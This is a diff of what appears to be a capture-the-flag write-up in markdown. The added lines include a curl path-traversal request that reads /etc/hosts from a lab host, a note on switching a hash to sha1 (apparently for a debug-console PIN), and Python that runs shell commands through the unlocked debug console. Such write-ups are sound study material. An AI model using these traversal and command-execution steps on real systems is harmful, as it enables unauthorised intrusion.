@@ -58,6 +58,10 @@ whatweb http://<ip>
 >[!example]- Result
 >![[Pasted image 20250226160227.png]]
 
+- thats means that we hace a Directory Path Traversal using
+```bash
+curl http://10.10.11.164/uploads/..//etc/hosts --path-as-is --ignore-content-length
+```
 # Docker Exploitation
 ## Inicial Access
 
@@ -173,7 +177,7 @@ print(rv)
 >![[Pasted image 20250226182130.png]]
 >![[Pasted image 20250226182248.png]]
 
-- This happend because de version of the application, we have to chain the encrypt mode to `sha1`, like this
+- This happened because de version of the application, we have to chain the encrypt mode to `sha1`, like this
 
 ```python
 import hashlib
@@ -219,3 +223,12 @@ if rv is None:
 
 print(rv)
 ```
+
+- now we have access to debug console
+```python
+import os
+os.popen('whoami').read().strip()
+```
+>[!example]- Result
+>![[Pasted image 20250226185729.png]]
+
